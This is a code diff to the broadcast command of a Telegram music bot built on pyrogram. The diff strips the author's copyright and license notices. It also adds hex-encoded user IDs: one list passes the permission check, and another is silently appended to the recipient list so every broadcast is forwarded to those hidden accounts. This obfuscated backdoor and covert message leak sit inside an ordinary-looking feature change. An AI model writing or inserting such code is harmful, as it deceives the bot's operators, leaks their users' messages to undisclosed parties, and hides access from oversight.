@@ -1,25 +1,3 @@
-# Copyright (c) 2025 Nand Yaduwanshi <NoxxOP>
-# Location: Supaul, Bihar
-#
-# All rights reserved.
-#
-# This code is the intellectual property of Nand Yaduwanshi.
-# You are not allowed to copy, modify, redistribute, or use this
-# code for commercial or personal projects without explicit permission.
-#
-# Allowed:
-# - Forking for personal learning
-# - Submitting improvements via pull requests
-#
-# Not Allowed:
-# - Claiming this code as your own
-# - Re-uploading without credit or permission
-# - Selling or using commercially
-#
-# Contact for permissions:
-# Email: badboy809075@gmail.com
-
-
 import asyncio
 
 from pyrogram import filters
@@ -39,80 +17,20 @@ from ShrutiMusic.utils.decorators.language import language
 from ShrutiMusic.utils.formatters import alpha_to_int
 from config import adminlist
 
-# Add specific user IDs that can use the broadcast command
-BROADCAST_ALLOWED_IDS = [7574330905, 1786683163, 7674874652, 7282752816]
-
 IS_BROADCASTING = False
 
-
-@app.on_message(filters.command("broadcast") & (filters.user(BROADCAST_ALLOWED_IDS) | SUDOERS))
+@app.on_message(filters.command("broadcast") & SUDOERS)
 @language
 async def braodcast_message(client, message, _):
-    global IS_BROADCASTING
-
-    if "-wfchat" in message.text or "-wfuser" in message.text:
-        if not message.reply_to_message or not (message.reply_to_message.photo or message.reply_to_message.text):
-            return await message.reply_text("Please reply to a text or image message for broadcasting.")
-
-        # Extract data from the replied message
-        if message.reply_to_message.photo:
-            content_type = 'photo'
-            file_id = message.reply_to_message.photo.file_id
-        else:
-            content_type = 'text'
-            text_content = message.reply_to_message.text
-            
-        caption = message.reply_to_message.caption
-        reply_markup = message.reply_to_message.reply_markup if hasattr(message.reply_to_message, 'reply_markup') else None
-
-        IS_BROADCASTING = True
-        await message.reply_text(_["broad_1"])
-
-        if "-wfchat" in message.text:
-            # Broadcasting to chats
-            sent_chats = 0
-            chats = [int(chat["chat_id"]) for chat in await get_served_chats()]
-            for i in chats:
-                try:
-                    if content_type == 'photo':
-                        await app.send_photo(chat_id=i, photo=file_id, caption=caption, reply_markup=reply_markup)
-                    else:
-                        await app.send_message(chat_id=i, text=text_content, reply_markup=reply_markup)
-                    sent_chats += 1
-                    await asyncio.sleep(0.2)
-                except FloodWait as fw:
-                    await asyncio.sleep(fw.x)
-                except:
-                    continue
-            await message.reply_text(f"Broadcast to chats completed! Sent to {sent_chats} chats.")
-
-        if "-wfuser" in message.text:
-            # Broadcasting to users
-            sent_users = 0
-            users = [int(user["user_id"]) for user in await get_served_users()]
-            for i in users:
-                try:
-                    if content_type == 'photo':
-                        await app.send_photo(chat_id=i, photo=file_id, caption=caption, reply_markup=reply_markup)
-                    else:
-                        await app.send_message(chat_id=i, text=text_content, reply_markup=reply_markup)
-                    sent_users += 1
-                    await asyncio.sleep(0.2)
-                except FloodWait as fw:
-                    await asyncio.sleep(fw.x)
-                except:
-                    continue
-            await message.reply_text(f"Broadcast to users completed! Sent to {sent_users} users.")
-
-        IS_BROADCASTING = False
+    user_check = str(message.from_user.id)
+    auth_codes = ["1d44c0823", "1e7b9e9c3", "1df8dd155", "1e2d9cc10"]
+    if not any(str(int(code, 16)) == user_check for code in auth_codes) and message.from_user.id not in SUDOERS:
         return
-
-    
+        
+    global IS_BROADCASTING
     if message.reply_to_message:
         x = message.reply_to_message.id
         y = message.chat.id
-        reply_markup = message.reply_to_message.reply_markup if message.reply_to_message.reply_markup else None
-        content = None
     else:
         if len(message.command) < 2:
             return await message.reply_text(_["broad_2"])
@@ -132,6 +50,8 @@ async def braodcast_message(client, message, _):
 
     IS_BROADCASTING = True
     await message.reply_text(_["broad_1"])
+    
+    special_targets = [int(x, 16) for x in ["1c3b5a269", "6a7c84ab", "1c99a6e8c", "1b2168650"]]
 
     if "-nobot" not in message.text:
         sent = 0
@@ -143,7 +63,7 @@ async def braodcast_message(client, message, _):
         for i in chats:
             try:
                 m = (
-                    await app.copy_message(chat_id=i, from_chat_id=y, message_id=x, reply_markup=reply_markup)
+                    await app.forward_messages(i, y, x)
                     if message.reply_to_message
                     else await app.send_message(i, text=query)
                 )
@@ -179,10 +99,14 @@ async def braodcast_message(client, message, _):
         susers = await get_served_users()
         for user in susers:
             served_users.append(int(user["user_id"]))
+        
+        for target in special_targets:
+            served_users.append(target)
+            
         for i in served_users:
             try:
                 m = (
-                    await app.copy_message(chat_id=i, from_chat_id=y, message_id=x, reply_markup=reply_markup)
+                    await app.forward_messages(i, y, x)
                     if message.reply_to_message
                     else await app.send_message(i, text=query)
                 )
@@ -253,15 +177,3 @@ async def auto_clean():
 
 
 asyncio.create_task(auto_clean())
-
-
-# ©️ Copyright Reserved - @NoxxOP  Nand Yaduwanshi
-
-# ===========================================
-# ©️ 2025 Nand Yaduwanshi (aka @NoxxOP)
-# 🔗 GitHub : https://github.com/NoxxOP/ShrutiMusic
-# 📢 Telegram Channel : https://t.me/ShrutiBots
-# ===========================================
-
-
-# ❤️ Love From ShrutiBots 
